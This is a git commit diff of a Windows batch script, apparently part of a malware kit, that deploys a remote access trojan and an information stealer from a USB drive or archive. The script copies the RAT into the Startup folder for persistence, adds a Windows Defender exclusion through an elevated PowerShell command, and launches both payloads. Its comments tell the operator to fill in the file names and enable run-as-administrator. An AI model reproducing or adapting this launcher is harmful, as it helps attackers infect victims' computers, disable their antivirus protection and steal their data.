8923d9ae4654b65ea9cb407da2836ed96f1d27fc
Naratorul <132078235+XYZNaratorul@users.noreply.github.com>
2024-12-10 17:05:26 +0200

    Update Optional_rat_runner_for_USB_or_archive.bat

--- Optional_rat_runner_for_USB_or_archive.bat
+++ Optional_rat_runner_for_USB_or_archive.bat
@@ -1,16 +1,17 @@
 :: CREATE AN SHORTCUT OF BOTH THE RAT AND THE STEALER AND MODIFY THE CODE BEFORE RUNNING. MAKE SURE TO ENABLE RUN AS ADMINISTRATOR ON THE SHORTCUT'S OPTIONS.
-
+:: CREATE AN FOLDER AND DRAG AND DROP BOTH THE RAT AND THE STEALER THEN MODIFY THE CODE.
 @echo off
 echo Running shortcuts with administrator privileges...
+:: MODIFY THIS VARIABLE WITH YOUR FOLDER NAME BEFORE RUNNING 
 set "folderPath=%~dp0lol"
 copy "%folderPath%\*RAT_NAME*" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" >nul
-::ORIGINAL STEALER FILE.
+::ORIGINAL STEALER FILE VARIABLE.
 set "PROGRAM_NAME=*STEALER_NAME*"
 powershell -Command "Start-Process powershell -ArgumentList 'Add-MpPreference -ExclusionPath \"\"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%PROGRAM_NAME%.exe\"\" -Force' -Verb RunAs"
 start "" "%folderPath%\*STEALER_NAME* - Shortcut"
 timeout /t 1 /nobreak >nul
 echo LOADING...
-start "" "%folderPath%\RAT.exe - Shortcut"
+start "" "%folderPath%\*RAT_NAME* - Shortcut"
 timeout /t 1 /nobreak >nul
 echo ...
 timeout /t 1 /nobreak >nul
